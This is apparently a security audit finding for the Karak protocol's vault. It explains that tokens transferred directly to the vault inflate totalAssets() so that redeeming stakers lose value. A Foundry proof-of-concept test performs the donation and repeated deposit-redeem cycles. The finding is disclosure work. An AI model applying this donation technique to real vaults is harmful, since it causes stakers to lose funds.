# Vulnerability details

## Description:

The current implementation of the Karak protocol relies on the `totalAssets()` function when converting assets to shares in the `convertToShares(...)` function and when converting shares to assets in the `convertToAssets(...)` function. This function returns the vault balance of the underlying asset, as shown below:

```solidity
function totalAssets() public view virtual returns (uint256 assets) {
    assets = SafeTransferLib.balanceOf(asset(), address(this));
}
```

However, a malicious attacker can manipulate the vault's token ratio and cause losses to stakers by transferring tokens directly to the vault address. This action increases the `totalAssets()` value without increasing the total supply of the vault token. As a result, whenever a staker redeems their shares, they will receive fewer assets than they should, with the excess remaining locked in the vault.

pragma solidity ^0.8.25;

import "../../src/Vault.sol";
import "../helpers/OperatorHelper.sol";

contract AttackTests is OperatorHelper {
    Vault vault;

    function mintAndDepositBy(uint256 amount, address by) public returns (uint256 shares) {
        vm.startPrank(by);
        depositToken.mint(by, amount);
        depositToken.approve(address(vault), amount);
        uint256 expectedShares = vault.convertToShares(amount);
        shares = vault.deposit(amount, by, expectedShares);
        vm.stopPrank();
    }

    function setupDDs() public {
        stake_vaults_to_dss();
        vault = Vault(address(vaults[0]));
        vm.prank(operator);
        core.registerOperatorToDSS(dss2, "");
    }

    function deposit_and_withdraw(uint256 amountToDeposit, address by) public {
        uint256 shares = mintAndDepositBy(amountToDeposit, by);
        console.log("shares minted", shares);
        uint256 assetsToWithdrawPreeview = vault.previewRedeem(shares);
        uint256 shareToWithdrawPreeview = vault.previewWithdraw(amountToDeposit);
        console.log("Preview:Number of assets to be redeemed", assetsToWithdrawPreeview);
        console.log("Preview:Number of shares to be redeemed", shareToWithdrawPreeview);
        vm.startPrank(by);
        vault.approve(address(vault), shares);
        bytes32 withdrawalKey = vault.startRedeem(shares, by);

        vm.warp(block.timestamp + Constants.MIN_WITHDRAWAL_DELAY);
        vault.finishRedeem(withdrawalKey);
        uint256 balance = depositToken.balanceOf(address(vault));
        console.log("After redeeming the token");
        console.log("contract balance of the underlying", balance);
        uint256 totalSuply = vault.totalSupply();
        uint256 totalAssets = vault.totalAssets();

        console.log("totalSuply", totalSuply);
        console.log("totalAssets", totalAssets);
        vm.stopPrank();
    }

    function test_token_inflation() public {
        setupDDs();
        console.log("Before transfering the token to the vault");
        deposit_and_withdraw(100 wei, address(1));

        console.log("After transfering the token to the vault");

        depositToken.mint(address(this), 10 wei);
        depositToken.transfer(address(vault), 10 wei);
        for (uint256 i = 0; i < 5; i++) {
            deposit_and_withdraw(100 wei, address(1));
            deposit_and_withdraw(1000 wei, address(2));
            deposit_and_withdraw(100 wei, address(3));
            deposit_and_withdraw(1000 wei, address(4));
            deposit_and_withdraw(10000 wei, address(2));
            deposit_and_withdraw(1000 wei, address(3));
            deposit_and_withdraw(100000 wei, address(4));
        }
    }
}
